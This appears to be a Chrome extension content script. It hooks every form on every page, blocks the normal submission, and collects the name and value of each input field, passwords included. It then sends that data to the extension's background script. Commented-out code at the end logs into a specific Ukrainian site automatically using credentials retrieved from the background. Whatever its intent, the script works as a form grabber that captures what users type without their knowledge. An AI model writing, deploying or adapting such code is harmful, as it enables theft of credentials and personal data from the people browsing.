
domain = {
    get: () => {
        url = window.location.href
        domain = (new URL(url))
        domain = domain.hostname
    }
}

function process_form(el){
    arr = []
    inputs = el.getElementsByTagName("input");
        i = 0
        a = 0
        while(i < inputs.length){
            if(inputs[i].hasAttribute("name") && (inputs[i].hasAttribute("class") || inputs[i].hasAttribute("id"))){
                obj = {}
                obj.name = inputs[i].name
                obj.value = inputs[i].value
                arr[a] = obj
                a++
            }
            i++
        } 


    console.log(arr)
    chrome.runtime.sendMessage({message: "send_user_data", data: arr})
}

insert_handler = () => {

    port = chrome.extension.connect({
        name: "MAIN SCRIPT STREAM"
    });
    port.onMessage.addListener(message => {
        if(message.type == "status"){
            port.postMessage("200")
        }
    })

    forms = document.getElementsByTagName("form");
    for(let i = 0; i < forms.length; i++){
        forms[i].removeEventListener("submit", () => {})
        forms[i].setAttribute("onsubmit", "return false;");
        forms[i].addEventListener("submit", function(){
            process_form(this)
        })
    }
    chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
        if(request.message == "PING"){
            sendResponse({message: "PONG"})
        }
    })
}
insert_handler()


// Скрипт для логина
// login = (data) => {
//     document.querySelector("a[href='#logout']").click()
//     document.getElementById("lp-username").value = data.username
//     document.getElementById("lp-password").value = data.password
//     document.getElementById("lp-remember").checked = true
//     document.getElementsByClassName("lp-button")[0].click
// }

// domain = get_domain()
// if(domain == "ftl.kherson.ua"){
//     chrome.runtime.sendMessage({message: "get_data", url: domain}, res => {
//         login(res)
//     })
// }